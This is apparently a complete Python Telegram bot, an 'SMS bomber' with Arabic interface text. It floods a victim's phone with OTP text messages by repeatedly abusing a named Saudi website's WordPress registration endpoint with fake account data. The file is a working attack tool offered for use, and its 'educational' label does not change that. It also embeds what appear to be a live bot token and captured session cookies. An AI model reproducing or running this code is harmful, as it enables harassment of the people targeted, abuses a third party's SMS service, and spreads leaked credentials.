#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# SMS BOMBER BOT - Polling Version (للتشغيل من Bash)

import time
import random
import string
import requests
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = '8636207709:AAH2MAikXql6z5ANCofjyF9iptz1gNeCYag'
bot = telebot.TeleBot(TOKEN)

# إزالة أي webhook نشط لتجنب خطأ 409
bot.remove_webhook()
time.sleep(1)

# ========== بيانات الاعتراض (آخر طلب ناجح) ==========
URL = "https://lp.com.sa/wp-admin/admin-ajax.php"
HEADERS = {
    "Host": "lp.com.sa",
    "x-requested-with": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "https://lp.com.sa",
    "Referer": "https://lp.com.sa/?login=true&redirect_to&page=1",
}
COOKIES = {
    "cf_clearance": "szbPePfEW7Uw1sOsYsDbGDhrBJaVmrzyML5.rXm5rLo-1780106561-1.2.1.1-FMxES_gMEr5P8_Sxn.xbGNeSRNXNMozrECZcrLwvAbEECafWyOf33VIYbzhAD6VXFNBJnQR41hT8CmSOwqUF2FKxg3bWhN27Z81jnXeFXcHIWkSWuHh2S6rEBv7Ht4TjlWB9dHrebAuPqTJf_hBZeJUb_RTvO4F653Ed34DEh21gr6FEOhFI4Me99p_UQYShZuaIvocAaseRqvrUVH8XJU5JuNNyNy3Vcid_W1BcCdFgJLcRulecmbjW.eOP8QAe_hoFdTbaP841mj84CA9hZd74YsrwvtOMqqdIY8645lG_TOXcfVUQ8zRq37vOx9NDU5.Lh7RKGveA7S1XdxX0fg",
    "PHPSESSID": "3d925f9c3f25ff57f27a24e7085d2727",
}
STATIC = {
    "instance_id": "9d7a64cb9e3432979a6473e9299b14d2",
    "digits_form": "75b905fa0c",
    "action": "digits_forms_ajax",
    "type": "register",
    "sub_action": "sms_otp",
    "digits_process_register": "1",
    "sms_otp": "",
    "otp_step_1": "1",
    "digits_otp_field": "1",
    "optional_data": "optional_data",
    "digits": "1",
    "digits_redirect_page": "-1",
    "_wp_http_referer": "/?login=true&redirect_to&page=1",
    "container": "digits_protected",
}

COUNTRIES = [
    ("🇸🇦 السعودية", "+966", 9),
    ("🇪🇬 مصر", "+20", 10),
    ("🇦🇪 الإمارات", "+971", 9),
    ("🇰🇼 الكويت", "+965", 8),
    ("🇶🇦 قطر", "+974", 8),
]

def rand_str(n=6): return ''.join(random.choices(string.ascii_letters, k=n))
def rand_email(): return f"{rand_str(8)}@gmail.com"
def fmt_phone(p): d=''.join(filter(str.isdigit, p)); return f"{d[:2]}+{d[2:5]}+{d[5:]}" if len(d)>=9 else d

def send_one(phone, code):
    with requests.Session() as s:
        data = {
            "digits_reg_name": rand_str(),
            "digits_reg_lastname": rand_str(),
            "email": rand_email(),
            "digt_countrycode": code,
            "phone": fmt_phone(phone),
            "digits_reg_password": f"Aa{rand_str(12)}",
            **STATIC
        }
        try:
            r = s.post(URL, headers=HEADERS, cookies=COOKIES, data=data, timeout=10)
            return "otp" in r.text.lower()
        except:
            return False

user_data = {}
stop_flags = {}

@bot.message_handler(commands=['start'])
def start(msg):
    cid = msg.chat.id
    markup = InlineKeyboardMarkup().add(InlineKeyboardButton("💣 بدء سبام", callback_data="new"))
    bot.send_message(cid, "🚀 بوت سبام OTP\n⚠️ للأغراض التعليمية", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def cb(call):
    cid = call.message.chat.id
    mid = call.message.message_id
    data = call.data
    bot.answer_callback_query(call.id)
    if data == "main":
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("💣 بدء سبام", callback_data="new"))
        bot.edit_message_text("🔹 القائمة الرئيسية", cid, mid, reply_markup=markup)
    elif data == "stop":
        stop_flags[cid] = True
        bot.edit_message_text("🛑 تم إيقاف الهجوم", cid, mid)
    elif data == "new":
        markup = InlineKeyboardMarkup()
        for name, code, ln in COUNTRIES:
            markup.add(InlineKeyboardButton(name, callback_data=f"c_{code}_{ln}"))
        bot.edit_message_text("🌍 اختر الدولة:", cid, mid, reply_markup=markup)
        user_data[cid] = {"step": "country"}
    elif data.startswith("c_"):
        parts = data.split("_")
        code = parts[1]
        ln = int(parts[2])
        user_data[cid] = {"step": "phone", "code": code, "len": ln}
        bot.edit_message_text(f"📱 أرسل الرقم (بدون {code})\nمثال: 5xxxxxxxx", cid, mid)

@bot.message_handler(func=lambda m: True)
def handle(m):
    cid = m.chat.id
    text = m.text.strip()
    sd = user_data.get(cid)
    if not sd:
        bot.reply_to(m, "🔹 استخدم /start")
        return
    if sd.get("step") == "phone":
        digits = ''.join(filter(str.isdigit, text))
        if len(digits) != sd["len"]:
            bot.reply_to(m, f"❌ طول الرقم خطأ، يجب {sd['len']} أرقام")
            return
        user_data[cid] = {"step": "total", "code": sd["code"], "phone": digits}
        bot.reply_to(m, "🔢 كم رسالة؟")
    elif sd.get("step") == "total":
        try:
            total = int(text)
            if total <= 0: raise
            code = sd["code"]
            phone = sd["phone"]
            full = f"{code}{phone}"
            msg = bot.send_message(cid, f"💣 بدء قصف {full} بـ {total} رسالة...\n✅0 ❌0 📊0")
            mid = msg.message_id
            stop_flags[cid] = False
            success = fail = 0
            for i in range(total):
                if stop_flags.get(cid):
                    bot.edit_message_text(f"🛑 تم الإيقاف ✅{success} ❌{fail} 📊{i}", cid, mid)
                    break
                if send_one(phone, code):
                    success += 1
                else:
                    fail += 1
                if (i+1) % 3 == 0 or (i+1) == total:
                    txt = f"💣 ✅{success} ❌{fail} 📊{i+1}"
                    if (i+1) == total:
                        txt += "\n🏁 اكتمل! /start"
                        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 القائمة", callback_data="main"))
                        bot.edit_message_text(txt, cid, mid, reply_markup=markup)
                    else:
                        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🛑 إيقاف", callback_data="stop"))
                        bot.edit_message_text(txt, cid, mid, reply_markup=markup)
                time.sleep(0.05)
            del user_data[cid]
            if cid in stop_flags: del stop_flags[cid]
        except:
            bot.reply_to(m, "❌ أدخل رقماً صحيحاً")

print("✅ البوت يعمل... (اضغط Ctrl+C للإيقاف)")
bot.infinity_polling()
